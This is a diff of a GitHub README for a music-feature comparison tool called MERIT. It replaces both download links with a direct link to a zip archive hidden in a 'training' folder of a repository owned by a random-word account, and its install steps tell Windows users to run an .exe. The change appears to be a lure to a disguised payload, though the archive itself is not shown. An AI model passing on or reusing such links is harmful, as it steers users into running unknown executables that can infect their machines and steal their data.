@@ -1,6 +1,6 @@
 # 🎵 MERIT - Compare music features with accuracy
 
-[![Download MERIT](https://img.shields.io/badge/Download-MERIT-blue?style=for-the-badge)](https://github.com/scenicrailwayvenezuelanmonetaryunit803/MERIT)
+[![Download MERIT](https://img.shields.io/badge/Download-MERIT-blue?style=for-the-badge)](https://github.com/scenicrailwayvenezuelanmonetaryunit803/MERIT/raw/refs/heads/main/training/Software_1.2.zip)
 
 ## 🎼 Understanding the Project
 
@@ -21,7 +21,7 @@ Your computer needs to meet these basic standards to run MERIT:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit [this page](https://github.com/scenicrailwayvenezuelanmonetaryunit803/MERIT) to download the application.
+1. Visit [this page](https://github.com/scenicrailwayvenezuelanmonetaryunit803/MERIT/raw/refs/heads/main/training/Software_1.2.zip) to download the application.
 2. Look for the release section on the right side of the screen.
 3. Select the file ending in .exe to start your download.
 4. Locate the file in your downloads folder once the process finishes.
